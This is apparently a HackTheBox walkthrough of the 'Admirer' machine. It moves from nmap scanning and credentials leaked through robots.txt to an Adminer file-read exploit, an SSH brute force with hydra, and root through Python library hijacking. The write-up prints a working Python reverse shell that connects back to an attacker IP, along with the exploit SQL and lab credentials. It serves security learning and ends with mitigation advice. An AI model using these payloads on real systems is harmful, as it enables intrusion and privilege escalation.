# Admirer

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage enumeration

- Misused `robots.txt` file

__Exploitation__

- Adminer File Disclosure vulnerability

__Priv Esc__

- Python library hijacking

***

This is my guide to the HackTheBox Linux machine _Admirer_.

## User Flag

To begin, let's scan _Admirer_ with `nmap`.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Sat Sep 26 17:10:10 2020 as: nmap -sC -sV -O -oA scan187 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.088s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/26%OT=21%CT=1%CU=36389%PV=Y%DS=2%DC=I%G=Y%TM=5F6FBC5
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 26 17:10:36 2020 -- 1 IP address (1 host up) scanned in 26.92 seconds
```

Our scan indicates that FTP is available, along with SSH and a webpage. While enumerating these open ports, we can run a full port scan, which doesn't yield anything of interest.

Anonymous logins are not allowed on FTP on this machine, so let's just into some webpage enumeration. Our scan indicates a `robots.txt` webpage, which we can also check out.

Navigating to the webpage yields little. It looks like a repository for photos, but no links or additional pages can be found from the home page.

Our next step could using a directory enumeration tool like `gobuster` to find more pages, but first, our `nmap` scan indicated a `robots.txt` page. This page usually contains instructions for the many of the good bots that crawl the internet, informing them of the "rules" of the site. This may contain some info on directories or pages that the developer doesn't want the bots to index.

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Awesome, so `waldo`, presumably our web admin, doesn't want the web crawlers to visit the `/admir-dir` directory, as it contains "contacts" and "creds". Fortunately for us, this doesn't actually prevent anyone from visiting the directory or its files.

Before we start to enumerate this directory, let's just see if there is a "contacts" and "credentials" pages within the `/admin-dir`. After a few extension attempts, it looks like the `/admin-dir/contacts.txt` exists, and contains some useful information.

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

We've got some names and emails, let's grab them, just in case we'll need them later.

Next, let's see if the "creds" are available in the same way. We'll see if there is a file at the location `/admin-dir/credentials.txt`.

```
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

This one yields even more valuable information, containing usernames and passwords. The most relevant one for us right now is the FTP login credentials, but we'll grab everything and store them in username and password files, in case we need to bruteforce some logins.

Let's go ahead and try our new FTP credentials.

```
$ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:seeker): ftpuser
```

Success. Here we find a compressed directory, `html.tar.gz`, which looks like it may contain a backup of the web server, or maybe partially. Let's use the `get` command to grab it with FTP, then open it up on our machine.

![](images/backup-files.png)

Okay, we see the `robots.txt` that we discovered earlier, and a `w4ld0s_s3cr3t_d1r` directory which, upon opening, reveals the two webpages we discovered earlier, indicating this is the `/admin_dir`. Opening the `index.php` file reveals some credentials for the database, which we will save for later.

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

What really stands out for us, though, is the `/utility-scripts` directory. Within it, are a few PHP files. It looks like we can navigate to them in our web browser. Let's check out the `/utility-scripts/info.php` page, which looks like it may display more information about the web server.  

Upon closer inspection, it looks like there's some information about a program called Adminer, with a version of 4.7.7.

![](images/info-script.png)

A quick Google search reveals that [Adminer](https://www.adminer.org/) is a Database manager in a single PHP file, and can be accessed at `adminer.php`. Navigating to `http://10.10.10.187/adminer.php` doesn't work so let's try it under one of the directories that we know.

The login page successfully loads at `10.10.10.187/utility-scripts/adminer.php`. We can attempt login with our previously discovered credentials, with no luck. Fortunately, we can now see that the actual version of the program is 4.6.2.

![](images/adminer-login.png)

A search reveals that this version of Adminer is [vulnerable to an attack](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) that can be used to reveal the credentials for the database, if they happen to stored in the configuration files. We remember earlier that database credentials were, in fact, stored, but it appears that they may not be up-to-date. Using this method, we may be able to dump what is currently stored.

In short, the attack requires us to create our own database, then connect to it with the victim's Adminer instance. There, we can load local files into our database, where we may be able to see sensitive information, like credentials.

Let's go ahead and host our database and access it. It should be noted that this database is accessible by everyone on HackTheBox, so take care with best security practices, and make sure to stop the process when we're done.

![](images/mysql.png)

We'll run our commands in the MariaDB monitor, creating our user, our database, and adding a password to the user.

```
> create user testuser@'%' identified by 'testuser';
> create database testdb;
> grant all privileges on testdb.* to 'testuser';
> set password for testuser@'%' = password('testpass');
```

Next, we'll jump back to the login page and input our information into the required fields. This should connect back to our database hosted on our machine.

![](images/adminer-creds.png)

Success. We're now logged onto our database with the Adminer database manager on the _Admirer_ machine.

![](images/adminer-success.png)

In order for the attack to work, we need to create a table. This is were the data that we pull from local files will be stored to be accessed after the attack.

![](images/create-table.png)

Now, to run the exploit. We will run the following SQL command to try to grab the `index.php` file. Ideally, this will have current database creds that'll help us get a foothold.  

```
load data local infile '../index.php'
into table testdb.t1
fields terminated by '\n'
```

![](images/adminer-command.png)

Query executed, with what appears to be no errors. Let's jump to our table we created earlier and see if it's populated with anything useful. Part of the way down, we can see the database credentials like before, but this time the password is different.

![](images/table-pass.png)

Great, let's go back to our MariaDB session and quickly clean up. We'll delete the user, drop the database and stop the `MySQL` process.

```
> drop user 'testuser'@'%';
> drop database testdb;
> exit
$ sudo service mysql stop
```

With our lists of usernames and passwords, we use hydra to quickly enumerate which combinations will work.

Found usernames:

```
waldo
bernadette
howard
leonard
amy
rajesh
penny
```

And passwords:

```
Wh3r3_1s_w4ld0?
]F7jLHw:*G>UPrTo}~A"d6b
Ezy]m27}OREc$
&<h5b~yK3F#{PaPB&dA}{H>
```

Since SSH appears to be the only service available that we can use these credentials with, we'll try that first.

```
$ hydra -L users.txt -P passwords.txt ssh://10.10.10.187
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 21:06:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:8/p:4), ~2 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: waldo   password: &<h5b~yK3F#{PaPB&dA}{H>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 21:06:33
```

Looks like there is a username and password combination that works on SSH. Specifically, our newly uncovered database password was reused by user `waldo` for their SSH login.

Let's grab the user flag.

![](images/user-flag.png)

## Root Flag

On to root. First thing we'll do is check the privileges of user `waldo`.

```
sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Okay, it looks like `waldo` can execute a bash script as root. Taking a look at the script, option number 6 calls the `backup.py` python script to perform a backup of the web data. Knowing that this bash script can be run as root by `waldo`, we can infer that this python script is also called as root as well. Let's give this python script a look.

```
$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

The script imports the `make_archive` function from the `shutil` library and runs the method. Because the script is executed as the root user, this function is also ran as root. If we can make this `backup.py` script import a function that we've created, we can potential execute our code as root.

Well, that's just what we are going to do with a technique called Python library hijacking. [Here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) is a great article on it. Essentially, we are going to alter the path that is used upon execution and point it the directory where we have our own malicious library.

Let's create our own `stutil.py` in the `/tmp` directory.

```
import os
import pty
import socket

lhost = "10.10.15.83"
lport = 4444

def make_archive(a, b, c):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((lhost, lport))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
```

This library only contains the `make_archive` function and when the function is called, it'll open a reverse shell to our machine. Let's save this, and go back to our box and start an `netcat` listener.

```
$ nc -lvnp 4444
```

Now, let's run the `admin_tasks.sh` script using `sudo`, but this time, we will define our own path using the `PYTHONPATH` variable.

```
$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```

Choosing option 6 will run the python script, importing our malicious library, and executing our function. Our reverse shell connects, and we have successfully executed our privileges. Let's grab the root flag.

![](images/root-flag.png)

***

### Mitigation

- A web administrator should know that the `robots.txt` file only works to prevent benevolent bots, like web crawlers, and doesn't prevent humans or bad bots from seeing directories. Actually, this file is a great way to enumerate hidden directories. This paired with plaintext credentials that are available publicly are a recipe for disaster.

- Avoid keeping management software public facing. If it needs to be publicly available, an administrator should strive to keep it up to date, as a vulnerability poses significant risk.

- Special caution should be taken when a user can run certain commands with escalated privileges. This risk is especially amplified when a user can run a command that executes a python script in this manner. Preventing the paths that Python uses to search for libraries from being writable may help mitigate the risks associated with this.

### Final Thoughts

I learned a lot from this box! It was different and although I spent a ton of time at the beginning enumerating directories, it helped me analyze hints and clues better and realize that bruteforcing directories may not be the best method going forward. It got me to delve into a couple topics more heavily as well, like the purpose of `robots.txt` and Python path hijacking. Overall, a good box.
